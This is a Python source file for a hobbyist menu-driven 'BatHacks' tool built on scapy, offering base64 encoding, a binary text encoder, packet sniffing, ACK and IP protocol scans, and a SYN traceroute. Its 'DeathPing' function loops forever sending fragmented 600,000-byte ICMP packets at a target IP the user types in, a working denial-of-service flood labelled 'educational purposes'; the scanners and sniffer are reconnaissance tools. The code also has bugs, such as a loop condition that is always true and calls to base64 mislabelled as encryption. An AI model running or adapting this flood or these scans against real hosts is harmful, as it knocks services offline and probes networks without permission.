import base64
from scapy.all import *
def intro():  
  print("\033[38;5;124m"+r"""
    ._.                 _.____.
     ) \              /    .(
     )  |            .'   .(
     ). ).          .'  .(
       ) |.        .'  (
       ). ;      ./  .(
        ) |      )  (
        ).;      :.(
         )|    .|.;
         .^--^./ (.
         ;0..0;   b
          'vv'_.:_.;  made by: SeaBass4201759
               m  M
  ▀█████████▄     ▄████████     ███             ▄█    █▄       ▄████████  ▄████████    ▄█   ▄█▄    ▄████████ 
    ███    ███   ███    ███ ▀█████████▄        ███    ███     ███    ███ ███    ███   ███ ▄███▀   ███    ███ 
    ███    ███   ███    ███    ▀███▀▀██        ███    ███     ███    ███ ███    █▀    ███▐██▀     ███    █▀  
  ▄███▄▄▄██▀    ███    ███     ███   ▀       ▄███▄▄▄▄███▄▄   ███    ███ ███         ▄█████▀      ███         
  ▀▀███▀▀▀██▄  ▀███████████     ███          ▀▀███▀▀▀▀███▀  ▀███████████ ███        ▀▀█████▄    ▀███████████ 
    ███    ██▄   ███    ███     ███            ███    ███     ███    ███ ███    █▄    ███▐██▄            ███ 
    ███    ███   ███    ███     ███            ███    ███     ███    ███ ███    ███   ███ ▀███▄    ▄█    ███ 
  ▄█████████▀    ███    █▀     ▄████▀          ███    █▀      ███    █▀  ████████▀    ███   ▀█▀  ▄████████▀  
                                                                                      ▀                      """+ "\033[0m") 
#base64 encryption function
def base64_encryption():
  encypt_This_Message = input('\nEnter what you want to encrypt in Base64: ')
  encode64 = base64.b64encode(encypt_This_Message.encode("utf-8"))
  messge = print(f"\nEncrypted message: {encode64}")
  
#base64 decrytpin function 
def base64_decryption():
  decrypt_This_Message = input('\nEnter what you want to decrypt in Base64: ')
  decode64 = base64.b64decode(decrypt_This_Message.encode("ascii"))
  print(f"\nDecrypted message: {decode64}")

def packet_sniffer():
  num = int(input("\nEnter how many packets you want to sniff: "))
  packet = sniff(count=num)
  packet.show()

def ACKscan():
  destination = input('\nEnter the domain name: ')
  ans, unans = sr(IP(dst=destination)/TCP(dport=[80,666],flags="A"))
  print(f"Ans: {ans.show()}")
  print(f"Unans: {unans.show}")

def SYNtraceroute():
  destination = input("Enter the destination: ")
  ans, unans = sr(IP(dst=destination,ttl=(1,10))/TCP(dport=53,flags="S"))
  ans.summary( lambda s,r: r.sprintf("%IP.src%\t{ICMP:%ICMP.type%}\t{TCP:%TCP.flags%}"))

def IPscan():
  ipnum = input("\nEnter IP number to scan: ")
  ans, unans = sr(IP(dst=ipnum,proto=(0,255))/"SCAPY",retry=2)
  print(f"ans: {ans.show()}")
  print(f"unans: {unans.show()}")  

def DeathPing():
  dest = input("Enter the target's IP: ")
  while True:
    send( fragment(IP(dst=dest)/ICMP()/("X"*600000)) )
    
def bat_encrypt():
  secret_bat_message = input("\nEnter what you want to encrypt: ")
  daList = []
  for char in secret_bat_message:
    dVal = [ord(char)]
    popval = dVal.pop(0)
    popval = int(popval)
    daList.append(bin(popval))
  print(":".join(daList)) #The binary val is 'str'

########### The brains of the operation ################
intro()
def daBrain():
  #bat hacks options
  selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ')
  
  while selection == '1' or '2' or '3': 
    #Cryptography
    if selection == '1':
      cryp_choice = input("\nWelcome to the cryptography section. What do you want to use?\n1.Base64\n2.Bat-ography\nEnter choice: ")
      #base64
      if cryp_choice == '1':
        en_decryp = input("\nWhat would you like to do?\n1.Encryption \n2.Decryption\nEnter choice: ")
        if en_decryp == '1':
          base64_encryption()
          selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ')
        elif en_decryp == '2':
          base64_decryption()
          selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ')
      #batcryption
      elif cryp_choice =='2':
        bat_encrypt()
        selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ')
      else:
        selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ')

    #Network Stuff 
    elif selection == '2':
      network_choice = input("\nWhat kind of network stuff do you want to do?\n1.Packet Sniffing\n2.ACK Scanner\n3.TCP SYN traceroute\n4.IP scanner\n5.Ping of Death #educational purposes\nEnter choice: ")
      if network_choice == '1':
        packet_sniffer()
        selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ')
      elif network_choice == '2':
       ACKscan()
       selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ') 
      elif network_choice == '3':
        SYNtraceroute()
        selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ') 
      elif network_choice == '4':
        IPscan()
        selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ')
      elif network_choice == '5':
        DeathPing()
        selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ') 
      else:
        selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ')

    elif selection == '3':
      exit()
    
    else:
      selection = input('\nWelcome to BatHacks choose what you want to do: \n1.Cryptography \n2.Network Stuff\n3.Exit\nEnter choice: ')
      
daBrain()
